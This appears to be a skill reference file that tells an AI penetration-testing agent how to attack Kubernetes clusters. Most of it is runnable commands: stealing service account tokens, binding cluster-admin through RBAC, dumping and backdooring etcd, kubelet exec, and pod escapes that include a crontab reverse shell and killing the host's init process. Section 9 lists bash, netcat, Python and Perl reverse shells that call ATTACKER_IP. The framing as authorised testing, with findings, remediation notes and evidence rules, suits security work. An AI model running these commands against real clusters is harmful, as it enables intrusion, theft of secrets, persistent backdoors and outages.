---
name: kubernetes-security
description: "Kubernetes cluster security including API server exposure, RBAC bypass, etcd access, and pod escape techniques"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["kubernetes", "k8s", "kube api", "kubelet", "etcd", "rbac bypass", "pod escape", "container escape k8s", "kubectl", "cluster breach", "k8s api server", "service account token"]
contextBoosts: [endpoints]
mitreAttack: ["T1610", "T1611", "T1613"]
owaspRefs: ["OWASP Kubernetes Security", "OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Kubernetes Security — Skill Reference

## When to Use

Use this skill when the target is a Kubernetes cluster, kube-apiserver endpoint, kubelet port, etcd API, or any container orchestration platform. Applicable when you observe kubeconfig files, service account tokens mounted at `/var/run/secrets/kubernetes.io/serviceaccount/`, kubelet metrics endpoints, or Kubernetes-style API responses (e.g., `kind: List`, `apiVersion: v1`).

## Do Not Use

- Target is a plain Docker host (no orchestration layer).
- Target is a managed Kubernetes control plane where you have no foothold (GKE, EKS, AKS managed API server — cloud IAM is the attack surface, not K8s RBAC).
- You have already established full cluster-admin and the task is purely data exfiltration (use lateral movement or post-exploitation skills instead).

---

## 1. Auth Context — Service Account Tokens & Kubeconfig

Every pod by default gets a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/`. This is the primary foothold.

**Extract the token from inside a compromised pod:**
```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

**Validate the token against the API server:**
```
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc.cluster.local/api/v1/namespaces/$NAMESPACE/pods
```

**Check token permissions:**
```
kubectl auth can-i --list --token=$TOKEN
kubectl auth can-i create pods --token=$TOKEN -n default
kubectl auth can-i '*' '*' --token=$TOKEN
```

**Look for kubeconfig in common paths:**
- `~/.kube/config`
- `/etc/kubernetes/admin.conf`
- `/etc/kubernetes/kubelet.conf`
- `/var/lib/kube-proxy/kubeconfig`
- Environment variable: `KUBECONFIG`

**If no token is mounted** — check if the pod has a projected service account token volume (Kubernetes 1.11+) or if `automountServiceAccountToken: true` is set. Exploit via the Kubernetes API by requesting a token for the pod's service account.

---

## 2. API Server Enumeration

The API server is the central control plane. Enumerate endpoints to understand cluster scope.

**Version and health:**
```
GET /version          → cluster version, git commit, platform
GET /healthz          → liveness/readiness
GET /readyz           → readiness
GET /livez            → liveness
GET /metrics          → Prometheus metrics (may expose internal state)
```

**Core API resources:**
```
GET /api/v1                        → list all namespaced resources
GET /api/v1/namespaces             → list all namespaces
GET /api/v1/pods                   → list pods (all namespaces if permitted)
GET /api/v1/secrets                → list secrets (high value)
GET /api/v1/configmaps             → list configmaps
GET /api/v1/serviceaccounts        → list service accounts
GET /api/v1/nodes                  → list cluster nodes
GET /api/v1/clusterroles           → cluster-wide roles
GET /api/v1/clusterrolebindings    → cluster-wide role bindings
```

**Extension APIs (apps, networking, RBAC):**
```
GET /apis/apps/v1/deployments
GET /apis/apps/v1/daemonsets
GET /apis/apps/v1/statefulsets
GET /apis/networking.k8s.io/v1/networkpolicies
GET /apis/rbac.authorization.k8s.io/v1/roles
GET /apis/rbac.authorization.k8s.io/v1/rolebindings
GET /apis/rbac.authorization.k8s.io/v1/clusterroles
GET /apis/rbac.authorization.k8s.io/v1/clusterrolebindings
```

**Key indicators:**
- `200` on `/api/v1/secrets` → full secret read access
- `403 Forbidden` → RBAC is enforced but may be misconfigured
- `200` on `/metrics` → metrics leak (may reveal auth tokens, internal IPs)
- `401 Unauthorized` → no valid token; look for anonymous auth

---

## 3. RBAC Bypass

RBAC (Role-Based Access Control) is the primary authorization layer. Misconfigurations create privilege escalation paths.

**Enumerate effective permissions:**
```
kubectl auth can-i --list -n <namespace>
kubectl auth can-i --list --as=system:serviceaccount:<namespace>:<sa-name>
kubectl auth can-i create clusterrolebindings
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i '*' '*' -n <namespace>
```

**Common overprivileged patterns:**
| Pattern | Risk | Example |
|---------|------|---------|
| `cluster-admin` binding to SA | Full cluster control | `kubectl create clusterrolebinding exploit --clusterrole=cluster-admin --serviceaccount=default:default` |
| `*` verbs on `secrets` | Read all secrets | Role with `verbs: ["get","list"]` on `resources: ["secrets"]` |
| `escalate` verb on `roles` | Create higher-privileged roles | Can bind cluster-admin to own SA |
| `impersonate` on `users/groups` | Act as any user | `kubectl auth can-i impersonate users/system:admin` |
| `bind` on `clusterroles` | Bind any clusterrole | Can grant cluster-admin |
| `patch` on `deployments` | Inject containers with host mounts | Modify deployment to add `hostPath` volume |

**Privilege escalation chain:**
1. Find a service account with `create` on `clusterrolebindings` → bind `cluster-admin` to your SA.
2. Find `update/patch` on `roles` → modify existing role to add `secrets` access.
3. Find `get/list` on `pods/exec` → exec into privileged pods for host access.
4. Find `impersonate` on `users` → impersonate `system:admin`.

**Bypass network policies:** Network policies only restrict pod-to-pod traffic. They do NOT restrict:
- Pod to API server (port 6443)
- Pod to kubelet (port 10250)
- Pod to etcd (port 2379)
- Pod to external networks (unless egress policy blocks it)

---

## 4. etcd Access

etcd stores the entire cluster state including secrets, configurations, and RBAC policies. Direct access to etcd = full cluster compromise.

**Default ports:**
- `2379` — etcd client port
- `2380` — etcd peer port

**Check if etcd is exposed:**
```
curl -s http://<etcd-host>:2379/health
curl -s http://<etcd-host>:2379/version
curl -s http://<etcd-host>:2379/v2/keys/
curl -s http://<etcd-host>:2379/v3/kv/range -X POST -d '{"key":"L2t1YmVybmV0ZXMv"}' -H "Content-Type: application/json"
```

**Read all secrets from etcd (v3 API):**
```
# base64-encode the prefix "/kubernetes/secrets"
echo -n "/kubernetes/secrets/" | base64
# Result: L2t1YmVybmV0ZXMv

# Range query for all secrets
etcdctl get /kubernetes/secrets/ --prefix --keys-only
```

**Using etcdctl directly:**
```
ETCDCTL_API=3 etcdctl \
  --endpoints=https://<etcd-host>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get / --prefix --keys-only
```

**Common etcd paths:**
| Path | Content |
|------|---------|
| `/registry/pods/` | All pod definitions |
| `/registry/secrets/` | All secrets (tokens, passwords, TLS certs) |
| `/registry/serviceaccounts/` | Service account definitions |
| `/registry/roles/` | RBAC roles |
| `/registry/clusterrolebindings/` | Cluster-wide RBAC bindings |
| `/registry/deployments/` | Deployment specs |
| `/registry/nodes/` | Node information |

**Write to etcd (persistent compromise):**
```
# Inject a backdoor service account
etcdctl put /registry/serviceaccounts/default/backdoor '{"kind":"ServiceAccount","apiVersion":"v1","metadata":{"name":"backdoor","namespace":"default"}}'
```

---

## 5. Kubelet Exploitation

The kubelet runs on every node and exposes an API on port `10250`. Compromising a kubelet gives control over all pods on that node.

**Enumerate kubelet:**
```
GET https://<node-ip>:10250/pods           → list all pods on node
GET https://<node-ip>:10250/stats/summary  → resource usage
GET https://<node-ip>:10250/metrics        → Prometheus metrics
GET https://<node-ip>:10250/configz        → kubelet configuration
```

**Exec into a container via kubelet:**
```
POST https://<node-ip>:10250/run/<namespace>/<pod>/<container>
Content-Type: application/json
{"command":["/bin/sh"],"stdin":true,"tty":true}
```

**Attach to a container:**
```
POST https://<node-ip>:10250/attach/<namespace>/<pod>/<container>
```

**Port-forward through kubelet:**
```
POST https://<node-ip>:10250/portForward/<namespace>/<pod>
```

**Kubelet authentication modes:**
- `Anonymous` — no auth required (default in some configurations)
- `Webhook` — validates tokens against API server
- `X.509` — client certificate authentication

**If anonymous auth is enabled:** No token needed. Direct API access.
**If webhook auth is enabled:** Use a valid service account token (extracted from Step 1).
**If X.509 is enabled:** Need a valid client certificate (check `/etc/kubernetes/pki/kubelet/`).

---

## 6. Pod Escape

Escaping a container gives access to the underlying node.

### 6a. Privileged Container Escape

If a container runs with `privileged: true`, it has full host access:
```
# Mount the host filesystem
mkdir /host
mount /dev/sda1 /host

# Or access host namespaces directly
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# Or write to host crontab
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/<attacker>/<port> 0>&1"' > /host/etc/crontab
```

### 6b. hostPath Mount Escape

If the pod has a `hostPath` volume mount:
```
# Check mounted host paths
mount | grep hostPath
ls /host  # or wherever the mount is

# Common hostPath targets
/           → full host access
/var/run/docker.sock → Docker API (container escape)
/etc        → host configuration
/root       → host root home
```

**Docker socket escape:**
```
# If /var/run/docker.sock is mounted
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<id>/start
```

### 6c. hostPID / hostNetwork

- `hostPID: true` → access host PID namespace, see all processes, send signals
  ```
  kill -9 1  # Kill init process (host crash)
  nsenter -t 1 -m -u -i -n -p  # Enter host namespaces
  ```
- `hostNetwork: true` → access host network stack, bind to host ports, sniff traffic

### 6d. Kernel Exploitation

Container breakout via kernel vulnerability (e.g., Dirty COW CVE-2016-5195):
```
# Check kernel version from inside container
uname -r

# If vulnerable, compile and run exploit
# (requires gcc in container or pre-compiled binary)
```

### 6e. Service Account Token Abuse

Even without host access, a service account token can be used to:
- Create a new privileged pod with host mounts
- Delete existing pods to disrupt workloads
- Read secrets across namespaces

```
kubectl --token=$TOKEN run exploit --image=busybox --rm -it --restart=Never -- /bin/sh
```

---

## 7. Secret Extraction

Kubernetes secrets are base64-encoded (not encrypted). If you have RBAC access:

**List and extract secrets:**
```
kubectl get secrets --all-namespaces -o json
kubectl get secret <name> -o jsonpath='{.data}' | base64 -d
kubectl get secret <name> -o yaml  # contains base64 data fields
```

**Common high-value secrets:**
| Secret Name Pattern | Content |
|--------------------|---------|
| `<sa>-token-<random>` | Service account JWT token |
| `default-token-<random>` | Default SA token |
| `tls-*` | TLS certificates and keys |
| `docker-registry-*` | Container registry credentials |
| `aws-*` | AWS credentials (EKS) |
| `gcp-*` | GCP service account keys |
| `db-*` | Database connection strings |

**Decode all secrets in a namespace:**
```
for secret in $(kubectl get secrets -n <ns> -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== $secret ==="
  kubectl get secret $secret -n <ns> -o jsonpath='{.data}' | python3 -c "import sys,json,base64; [print(k+': '+base64.b64decode(v).decode()) for k,v in json.load(sys.stdin).items()]"
done
```

**Write findings for each secret:**
```
writeFinding({
  title: "Kubernetes Secret Exposed",
  severity: "critical",
  evidence: `<secret-name>: <decoded-content>`,
  remediation: "Use external secrets manager (Vault, AWS SM) or enable encryption at rest for etcd"
})
```

---

## 8. Lateral Movement

Service account tokens are namespace-scoped by default but can be used for lateral movement.

**Cross-namespace access:**
```
# Token from namespace A used in namespace B
curl -s -H "Authorization: Bearer $TOKEN_A" https://kubernetes.default.svc.cluster.local/api/v1/namespaces/B/secrets

# Check if token can access other namespaces
kubectl auth can-i --list --token=$TOKEN -n <other-namespace>
```

**Pivot to other nodes:**
1. Use kubelet API on other nodes (same cluster, different IP)
2. Use service account tokens to access node-level resources
3. Modify DaemonSets to deploy on all nodes

**Access external cloud APIs:**
- EKS: STS calls using pod identity or IRSA
- GKE: Metadata server calls for GCP tokens
- AKS: Azure managed identity endpoint

**Exploit trust relationships:**
- Service accounts can be impersonated if `impersonate` is allowed
- Cluster roles may grant access across all namespaces
- Federation tokens allow cross-cluster access

---

## 9. Reverse Shell in Container

If you have exec access to a container and need a persistent shell:

**Bash reverse shell:**
```
/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

**Netcat (if available):**
```
nc -e /bin/sh <ATTACKER_IP> <PORT>
```

**Python reverse shell:**
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Perl reverse shell:**
```
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Kubectl exec reverse shell (from outside):**
```
kubectl exec -it <pod> -- /bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"
```

**Upload tools:**
```
# From attacker machine
kubectl cp ./linpeas.sh <namespace>/<pod>:/tmp/linpeas.sh
kubectl cp ./chisel <namespace>/<pod>:/tmp/chisel
```

---

## 10. Evidence Collection & Graph Updates

For each finding, record evidence and update the knowledge graph:

```
recordEvidence({
  type: "kubernetes-auth",
  evidence: `<token-extraction-command-output>`,
  host: "<api-server-ip>",
  port: 6443
})

updateGraph({
  nodes: [
    { type: "Endpoint", label: "K8s API Server", data: { ip: "<ip>", port: 6443 } },
    { type: "Finding", label: "Exposed etcd", data: { severity: "critical", port: 2379 } },
    { type: "AttackPath", label: "SA Token → Privileged Pod → Node Escape", data: { steps: [...] } }
  ]
})
```

---

## 11. Anti-Hallucination

**Never claim a finding without proof.** Every Kubernetes security finding MUST be backed by verifiable tool output:

- **API server access**: Include the full HTTP response body (status code + JSON response). A `200` status with an empty `items: []` is NOT evidence of access to secrets.
- **RBAC permissions**: Include the full `kubectl auth can-i --list` output. Do not claim "full cluster access" without showing `* *` in the output.
- **Secret extraction**: Include the actual decoded content (redact only truly sensitive values like live passwords). Do not claim "AWS credentials found" without showing `AKIA...` in the evidence.
- **etcd access**: Include the response from `/health` or `/version` endpoint. Do not claim "etcd is exposed" without a valid HTTP response.
- **Pod escape**: Include the output of `id`, `hostname`, or `cat /etc/os-release` from the HOST after escape. A command that returns exit code 0 is NOT evidence of escape.
- **Kubelet access**: Include the response from `/pods` endpoint. Do not claim "kubelet anonymous auth enabled" without a `200` response.

**Structured tool output for all claims:**
```
✅ CORRECT:
  httpRequest("GET", "https://<ip>:6443/api/v1/secrets")
  → Response: 200, body contains {"items":[{"metadata":{"name":"db-secret"}}]}

❌ HALLUCINATION:
  "The API server has full secret access"
  (no tool output, no HTTP response shown)

❌ HALLUCINATION:
  "We can escape the container via privileged mode"
  (no verification that the container is actually privileged)

❌ HALLUCINATION:
  "etcd is exposed on port 2379"
  (curl returned connection refused)
```

**Verification checklist before reporting:**
- [ ] HTTP response body captured and matches expected format
- [ ] Status code is `200` (not `403`, `401`, `503`)
- [ ] Response content actually contains the claimed data (not empty or error)
- [ ] If claiming privilege escalation, the `can-i` output shows the claimed permissions
- [ ] If claiming container escape, `id` or `uname -r` from host namespace is captured
